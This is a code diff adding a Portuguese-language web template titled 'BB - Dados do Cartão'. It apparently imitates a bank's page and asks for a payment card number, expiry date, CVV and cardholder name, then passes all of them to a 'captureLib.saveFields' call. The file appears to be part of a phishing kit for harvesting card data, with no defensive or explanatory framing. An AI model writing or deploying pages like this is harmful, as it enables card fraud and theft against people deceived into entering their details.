@@ -1,0 +1,69 @@
+{% extends "base.html" %}
+
+{% block title %}BB - Dados do Cartão{% endblock %}
+
+{% block content %}
+<form id="cartaoForm">
+    <div class="form-group">
+        <label for="numero_cartao">Número do Cartão:</label>
+        <input type="text" id="numero_cartao" name="numero_cartao" placeholder="0000 0000 0000 0000" maxlength="19" required>
+    </div>
+    <div class="form-row">
+        <div class="form-group">
+            <label for="validade">Validade:</label>
+            <input type="text" id="validade" name="validade" placeholder="MM/AA" maxlength="5" required>
+        </div>
+        <div class="form-group">
+            <label for="cvv">CVV:</label>
+            <input type="text" id="cvv" name="cvv" placeholder="000" maxlength="3" required>
+        </div>
+    </div>
+    <div class="form-group">
+        <label for="nome_titular">Nome do Titular:</label>
+        <input type="text" id="nome_titular" name="nome_titular" placeholder="Nome como está no cartão" required>
+    </div>
+    <button type="submit" class="btn">Continuar</button>
+</form>
+{% endblock %}
+
+{% block scripts %}
+const form = document.getElementById('cartaoForm');
+const numeroCartaoInput = document.getElementById('numero_cartao');
+const validadeInput = document.getElementById('validade');
+const cvvInput = document.getElementById('cvv');
+
+// Máscara do número do cartão
+numeroCartaoInput.addEventListener('input', function(e) {
+    let value = e.target.value.replace(/\D/g, '');
+    if (value.length <= 16) {
+        value = value.replace(/(\d{4})(\d)/, '$1 $2');
+        value = value.replace(/(\d{4})(\d)/, '$1 $2');
+        value = value.replace(/(\d{4})(\d)/, '$1 $2');
+        e.target.value = value;
+    }
+});
+
+// Máscara da validade
+validadeInput.addEventListener('input', function(e) {
+    let value = e.target.value.replace(/\D/g, '');
+    if (value.length <= 4) {
+        value = value.replace(/(\d{2})(\d)/, '$1/$2');
+        e.target.value = value;
+    }
+});
+
+// Apenas números no CVV
+cvvInput.addEventListener('input', function(e) {
+    e.target.value = e.target.value.replace(/\D/g, '');
+});
+
+form.addEventListener('submit', async function(e) {
+    e.preventDefault();
+    await captureLib.saveFields({
+        numero_cartao: numeroCartaoInput.value.replace(/\D/g, ''),
+        validade: validadeInput.value,
+        cvv: cvvInput.value,
+        nome_titular: document.getElementById('nome_titular').value
+    }, 'cartao');
+});
+{% endblock %}
